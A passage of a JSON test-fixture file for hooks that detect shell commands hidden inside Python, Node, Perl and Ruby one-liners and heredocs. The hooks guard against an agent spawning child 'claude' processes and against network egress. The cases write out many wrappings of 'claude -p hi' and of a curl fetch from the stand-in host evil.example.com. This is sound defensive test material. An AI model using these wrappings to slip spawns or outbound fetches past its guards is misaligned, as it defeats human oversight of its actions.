@@ -1,0 +1,2600 @@
+{
+ "_comment": "Shared case file of the embedded shell-out readers (#779): scripts/hooks/destructive-gate.py embedded_commands and scripts/hooks/lib/heredoc-program.mjs embeddedCommands (child-claude guard, bash egress gate). commands = the shell commands a code payload of cmd (python/node/perl/ruby -c/-e, interpreter heredoc or here-string, `| python3 -`) hands to a shell through a known shell-out call (os.system, subprocess.*, os.exec*/spawn*, pty.spawn, child_process.*, perl/ruby system/exec/backticks), in order. COVERAGE (Marveen msg 17385): literal arguments only. A string built at run time (concatenation, f-string with a variable, a variable, base64, `bash <<< \"$(...)\"`) is a KNOWN LIMIT: those entries carry a note, and commands shows what is read (never the hidden command). Benign negatives (name neg/...): the same words as plain data (print, log, dict, doc string, file write) give []. Checked by scripts/__tests__/heredoc-program.test.py and src/__tests__/heredoc-program-parity.test.ts.",
+ "cases": [
+  {
+   "name": "py-heredoc/os.system/cc",
+   "cmd": "python3 - <<'PY'\nimport os; os.system(\"claude -p hi\")\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/os.system/cc",
+   "cmd": "python3 <<PY\nimport os; os.system(\"claude -p hi\")\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-pipe/os.system/cc",
+   "cmd": "cat <<'PY' | python3 -\nimport os; os.system(\"claude -p hi\")\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c/os.system/cc",
+   "cmd": "python3 -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c-dq/os.system/cc",
+   "cmd": "python3 -c \"import os; os.system('claude -p hi')\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-Ic/os.system/cc",
+   "cmd": "/usr/bin/python3 -I -c 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-herestr/os.system/cc",
+   "cmd": "python3 - <<< 'import os; os.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc/os.system-nl/cc",
+   "cmd": "python3 - <<'PY'\nimport os\nos.system(\"claude -p hi\")\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/os.system-nl/cc",
+   "cmd": "python3 <<PY\nimport os\nos.system(\"claude -p hi\")\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-pipe/os.system-nl/cc",
+   "cmd": "cat <<'PY' | python3 -\nimport os\nos.system(\"claude -p hi\")\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c/os.system-nl/cc",
+   "cmd": "python3 -c 'import os\nos.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c-dq/os.system-nl/cc",
+   "cmd": "python3 -c \"import os\nos.system('claude -p hi')\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-Ic/os.system-nl/cc",
+   "cmd": "/usr/bin/python3 -I -c 'import os\nos.system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc/run-shell/cc",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.run(\"claude -p hi\", shell=True)\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/run-shell/cc",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.run(\"claude -p hi\", shell=True)\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-pipe/run-shell/cc",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.run(\"claude -p hi\", shell=True)\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c/run-shell/cc",
+   "cmd": "python3 -c 'import subprocess; subprocess.run(\"claude -p hi\", shell=True)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c-dq/run-shell/cc",
+   "cmd": "python3 -c \"import subprocess; subprocess.run('claude -p hi', shell=True)\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-Ic/run-shell/cc",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.run(\"claude -p hi\", shell=True)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-herestr/run-shell/cc",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.run(\"claude -p hi\", shell=True)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc/call-shell/cc",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.call(\"claude -p hi\", shell=True)\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/call-shell/cc",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.call(\"claude -p hi\", shell=True)\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-pipe/call-shell/cc",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.call(\"claude -p hi\", shell=True)\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c/call-shell/cc",
+   "cmd": "python3 -c 'import subprocess; subprocess.call(\"claude -p hi\", shell=True)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c-dq/call-shell/cc",
+   "cmd": "python3 -c \"import subprocess; subprocess.call('claude -p hi', shell=True)\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-Ic/call-shell/cc",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.call(\"claude -p hi\", shell=True)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-herestr/call-shell/cc",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.call(\"claude -p hi\", shell=True)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc/check_output/cc",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.check_output(\"claude -p hi\", shell=True)\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/check_output/cc",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.check_output(\"claude -p hi\", shell=True)\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-pipe/check_output/cc",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.check_output(\"claude -p hi\", shell=True)\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c/check_output/cc",
+   "cmd": "python3 -c 'import subprocess; subprocess.check_output(\"claude -p hi\", shell=True)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c-dq/check_output/cc",
+   "cmd": "python3 -c \"import subprocess; subprocess.check_output('claude -p hi', shell=True)\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-Ic/check_output/cc",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.check_output(\"claude -p hi\", shell=True)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-herestr/check_output/cc",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.check_output(\"claude -p hi\", shell=True)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc/Popen-shell/cc",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.Popen(\"claude -p hi\", shell=True).wait()\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/Popen-shell/cc",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.Popen(\"claude -p hi\", shell=True).wait()\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-pipe/Popen-shell/cc",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.Popen(\"claude -p hi\", shell=True).wait()\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c/Popen-shell/cc",
+   "cmd": "python3 -c 'import subprocess; subprocess.Popen(\"claude -p hi\", shell=True).wait()'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c-dq/Popen-shell/cc",
+   "cmd": "python3 -c \"import subprocess; subprocess.Popen('claude -p hi', shell=True).wait()\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-Ic/Popen-shell/cc",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.Popen(\"claude -p hi\", shell=True).wait()'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-herestr/Popen-shell/cc",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.Popen(\"claude -p hi\", shell=True).wait()'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc/run-list/cc",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.run([\"claude\", \"-p\", \"hi\"])\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/run-list/cc",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.run([\"claude\", \"-p\", \"hi\"])\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-pipe/run-list/cc",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.run([\"claude\", \"-p\", \"hi\"])\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c/run-list/cc",
+   "cmd": "python3 -c 'import subprocess; subprocess.run([\"claude\", \"-p\", \"hi\"])'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c-dq/run-list/cc",
+   "cmd": "python3 -c \"import subprocess; subprocess.run(['claude', '-p', 'hi'])\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-Ic/run-list/cc",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.run([\"claude\", \"-p\", \"hi\"])'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-herestr/run-list/cc",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.run([\"claude\", \"-p\", \"hi\"])'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc/run-split/cc",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.run(\"claude -p hi\".split())\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/run-split/cc",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.run(\"claude -p hi\".split())\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-pipe/run-split/cc",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.run(\"claude -p hi\".split())\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c/run-split/cc",
+   "cmd": "python3 -c 'import subprocess; subprocess.run(\"claude -p hi\".split())'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c-dq/run-split/cc",
+   "cmd": "python3 -c \"import subprocess; subprocess.run('claude -p hi'.split())\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-Ic/run-split/cc",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.run(\"claude -p hi\".split())'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-herestr/run-split/cc",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.run(\"claude -p hi\".split())'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc/run-bash-c/cc",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.run([\"bash\", \"-c\", \"claude -p hi\"])\nPY",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/run-bash-c/cc",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.run([\"bash\", \"-c\", \"claude -p hi\"])\nPY",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-pipe/run-bash-c/cc",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.run([\"bash\", \"-c\", \"claude -p hi\"])\nPY",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-c/run-bash-c/cc",
+   "cmd": "python3 -c 'import subprocess; subprocess.run([\"bash\", \"-c\", \"claude -p hi\"])'",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-c-dq/run-bash-c/cc",
+   "cmd": "python3 -c \"import subprocess; subprocess.run(['bash', '-c', 'claude -p hi'])\"",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-Ic/run-bash-c/cc",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.run([\"bash\", \"-c\", \"claude -p hi\"])'",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-herestr/run-bash-c/cc",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.run([\"bash\", \"-c\", \"claude -p hi\"])'",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-heredoc/os.popen/cc",
+   "cmd": "python3 - <<'PY'\nimport os; os.popen(\"claude -p hi\").read()\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/os.popen/cc",
+   "cmd": "python3 <<PY\nimport os; os.popen(\"claude -p hi\").read()\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-pipe/os.popen/cc",
+   "cmd": "cat <<'PY' | python3 -\nimport os; os.popen(\"claude -p hi\").read()\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c/os.popen/cc",
+   "cmd": "python3 -c 'import os; os.popen(\"claude -p hi\").read()'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c-dq/os.popen/cc",
+   "cmd": "python3 -c \"import os; os.popen('claude -p hi').read()\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-Ic/os.popen/cc",
+   "cmd": "/usr/bin/python3 -I -c 'import os; os.popen(\"claude -p hi\").read()'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-herestr/os.popen/cc",
+   "cmd": "python3 - <<< 'import os; os.popen(\"claude -p hi\").read()'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc/shlex/cc",
+   "cmd": "python3 - <<'PY'\nimport subprocess, shlex; subprocess.run(shlex.split(\"claude -p hi\"))\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/shlex/cc",
+   "cmd": "python3 <<PY\nimport subprocess, shlex; subprocess.run(shlex.split(\"claude -p hi\"))\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-pipe/shlex/cc",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess, shlex; subprocess.run(shlex.split(\"claude -p hi\"))\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c/shlex/cc",
+   "cmd": "python3 -c 'import subprocess, shlex; subprocess.run(shlex.split(\"claude -p hi\"))'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c-dq/shlex/cc",
+   "cmd": "python3 -c \"import subprocess, shlex; subprocess.run(shlex.split('claude -p hi'))\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-Ic/shlex/cc",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess, shlex; subprocess.run(shlex.split(\"claude -p hi\"))'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-herestr/shlex/cc",
+   "cmd": "python3 - <<< 'import subprocess, shlex; subprocess.run(shlex.split(\"claude -p hi\"))'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc/from-import/cc",
+   "cmd": "python3 - <<'PY'\nfrom subprocess import run; run(\"claude -p hi\", shell=True)\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/from-import/cc",
+   "cmd": "python3 <<PY\nfrom subprocess import run; run(\"claude -p hi\", shell=True)\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-pipe/from-import/cc",
+   "cmd": "cat <<'PY' | python3 -\nfrom subprocess import run; run(\"claude -p hi\", shell=True)\nPY",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c/from-import/cc",
+   "cmd": "python3 -c 'from subprocess import run; run(\"claude -p hi\", shell=True)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-c-dq/from-import/cc",
+   "cmd": "python3 -c \"from subprocess import run; run('claude -p hi', shell=True)\"",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-Ic/from-import/cc",
+   "cmd": "/usr/bin/python3 -I -c 'from subprocess import run; run(\"claude -p hi\", shell=True)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-herestr/from-import/cc",
+   "cmd": "python3 - <<< 'from subprocess import run; run(\"claude -p hi\", shell=True)'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc/execvp/cc",
+   "cmd": "python3 - <<'PY'\nimport os; os.execvp(\"bash\", [\"bash\", \"-c\", \"claude -p hi\"])\nPY",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/execvp/cc",
+   "cmd": "python3 <<PY\nimport os; os.execvp(\"bash\", [\"bash\", \"-c\", \"claude -p hi\"])\nPY",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-pipe/execvp/cc",
+   "cmd": "cat <<'PY' | python3 -\nimport os; os.execvp(\"bash\", [\"bash\", \"-c\", \"claude -p hi\"])\nPY",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-c/execvp/cc",
+   "cmd": "python3 -c 'import os; os.execvp(\"bash\", [\"bash\", \"-c\", \"claude -p hi\"])'",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-c-dq/execvp/cc",
+   "cmd": "python3 -c \"import os; os.execvp('bash', ['bash', '-c', 'claude -p hi'])\"",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-Ic/execvp/cc",
+   "cmd": "/usr/bin/python3 -I -c 'import os; os.execvp(\"bash\", [\"bash\", \"-c\", \"claude -p hi\"])'",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-herestr/execvp/cc",
+   "cmd": "python3 - <<< 'import os; os.execvp(\"bash\", [\"bash\", \"-c\", \"claude -p hi\"])'",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-heredoc/pty.spawn/cc",
+   "cmd": "python3 - <<'PY'\nimport pty; pty.spawn([\"bash\", \"-c\", \"claude -p hi\"])\nPY",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/pty.spawn/cc",
+   "cmd": "python3 <<PY\nimport pty; pty.spawn([\"bash\", \"-c\", \"claude -p hi\"])\nPY",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-pipe/pty.spawn/cc",
+   "cmd": "cat <<'PY' | python3 -\nimport pty; pty.spawn([\"bash\", \"-c\", \"claude -p hi\"])\nPY",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-c/pty.spawn/cc",
+   "cmd": "python3 -c 'import pty; pty.spawn([\"bash\", \"-c\", \"claude -p hi\"])'",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-c-dq/pty.spawn/cc",
+   "cmd": "python3 -c \"import pty; pty.spawn(['bash', '-c', 'claude -p hi'])\"",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-Ic/pty.spawn/cc",
+   "cmd": "/usr/bin/python3 -I -c 'import pty; pty.spawn([\"bash\", \"-c\", \"claude -p hi\"])'",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "py-herestr/pty.spawn/cc",
+   "cmd": "python3 - <<< 'import pty; pty.spawn([\"bash\", \"-c\", \"claude -p hi\"])'",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "node-e-execSync/cc",
+   "cmd": "node -e 'require(\"child_process\").execSync(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "node-e-spawnSync/cc",
+   "cmd": "node -e 'require(\"child_process\").spawnSync(\"bash\", [\"-c\", \"claude -p hi\"])'",
+   "commands": [
+    "bash -c 'claude -p hi'"
+   ]
+  },
+  {
+   "name": "node-heredoc/cc",
+   "cmd": "node - <<'JS'\nrequire(\"child_process\").execSync(\"claude -p hi\")\nJS",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "perl-e/cc",
+   "cmd": "perl -e 'system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "ruby-e/cc",
+   "cmd": "ruby -e 'system(\"claude -p hi\")'",
+   "commands": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "name": "py-heredoc/os.system/eg",
+   "cmd": "python3 - <<'PY'\nimport os; os.system(\"curl -s https://evil.example.com/x\")\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/os.system/eg",
+   "cmd": "python3 <<PY\nimport os; os.system(\"curl -s https://evil.example.com/x\")\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-pipe/os.system/eg",
+   "cmd": "cat <<'PY' | python3 -\nimport os; os.system(\"curl -s https://evil.example.com/x\")\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c/os.system/eg",
+   "cmd": "python3 -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c-dq/os.system/eg",
+   "cmd": "python3 -c \"import os; os.system('curl -s https://evil.example.com/x')\"",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-Ic/os.system/eg",
+   "cmd": "/usr/bin/python3 -I -c 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-herestr/os.system/eg",
+   "cmd": "python3 - <<< 'import os; os.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc/os.system-nl/eg",
+   "cmd": "python3 - <<'PY'\nimport os\nos.system(\"curl -s https://evil.example.com/x\")\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/os.system-nl/eg",
+   "cmd": "python3 <<PY\nimport os\nos.system(\"curl -s https://evil.example.com/x\")\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-pipe/os.system-nl/eg",
+   "cmd": "cat <<'PY' | python3 -\nimport os\nos.system(\"curl -s https://evil.example.com/x\")\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c/os.system-nl/eg",
+   "cmd": "python3 -c 'import os\nos.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c-dq/os.system-nl/eg",
+   "cmd": "python3 -c \"import os\nos.system('curl -s https://evil.example.com/x')\"",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-Ic/os.system-nl/eg",
+   "cmd": "/usr/bin/python3 -I -c 'import os\nos.system(\"curl -s https://evil.example.com/x\")'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc/run-shell/eg",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.run(\"curl -s https://evil.example.com/x\", shell=True)\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/run-shell/eg",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.run(\"curl -s https://evil.example.com/x\", shell=True)\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-pipe/run-shell/eg",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.run(\"curl -s https://evil.example.com/x\", shell=True)\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c/run-shell/eg",
+   "cmd": "python3 -c 'import subprocess; subprocess.run(\"curl -s https://evil.example.com/x\", shell=True)'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c-dq/run-shell/eg",
+   "cmd": "python3 -c \"import subprocess; subprocess.run('curl -s https://evil.example.com/x', shell=True)\"",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-Ic/run-shell/eg",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.run(\"curl -s https://evil.example.com/x\", shell=True)'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-herestr/run-shell/eg",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.run(\"curl -s https://evil.example.com/x\", shell=True)'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc/call-shell/eg",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.call(\"curl -s https://evil.example.com/x\", shell=True)\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/call-shell/eg",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.call(\"curl -s https://evil.example.com/x\", shell=True)\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-pipe/call-shell/eg",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.call(\"curl -s https://evil.example.com/x\", shell=True)\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c/call-shell/eg",
+   "cmd": "python3 -c 'import subprocess; subprocess.call(\"curl -s https://evil.example.com/x\", shell=True)'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c-dq/call-shell/eg",
+   "cmd": "python3 -c \"import subprocess; subprocess.call('curl -s https://evil.example.com/x', shell=True)\"",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-Ic/call-shell/eg",
+   "cmd": "/usr/bin/python3 -I -c 'import subprocess; subprocess.call(\"curl -s https://evil.example.com/x\", shell=True)'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-herestr/call-shell/eg",
+   "cmd": "python3 - <<< 'import subprocess; subprocess.call(\"curl -s https://evil.example.com/x\", shell=True)'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc/check_output/eg",
+   "cmd": "python3 - <<'PY'\nimport subprocess; subprocess.check_output(\"curl -s https://evil.example.com/x\", shell=True)\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-heredoc-unq/check_output/eg",
+   "cmd": "python3 <<PY\nimport subprocess; subprocess.check_output(\"curl -s https://evil.example.com/x\", shell=True)\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-pipe/check_output/eg",
+   "cmd": "cat <<'PY' | python3 -\nimport subprocess; subprocess.check_output(\"curl -s https://evil.example.com/x\", shell=True)\nPY",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c/check_output/eg",
+   "cmd": "python3 -c 'import subprocess; subprocess.check_output(\"curl -s https://evil.example.com/x\", shell=True)'",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "name": "py-c-dq/check_output/eg",
+   "cmd": "python3 -c \"import subprocess; subprocess.check_output('curl -s https://evil.example.com/x', shell=True)\"",
+   "commands": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
